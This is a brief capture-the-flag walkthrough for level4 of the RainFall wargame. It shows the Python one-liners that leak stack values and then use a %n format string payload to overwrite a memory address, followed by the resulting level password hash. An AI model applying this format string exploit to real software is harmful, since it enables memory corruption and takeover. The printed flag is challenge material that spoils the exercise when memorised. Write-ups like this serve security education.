# Walkthrough level4

```bash
level4@RainFall:~$ python -c "print('AAAA' + '%08x ' * 20)" | ./level4
AAAAb7ff26b0 bffff784 b7fd0ff4 00000000 00000000 bffff748 0804848d bffff540 00000200 b7fd1ac0 b7ff37d0 41414141 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078
```

```bash
level4@RainFall:~$ python -c "print('\x10\x98\x04\x08' + '%08x ' * 10 + '%16930022d%n')" > /tmp/a
(...)
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

Addresse is 12 addresses further.
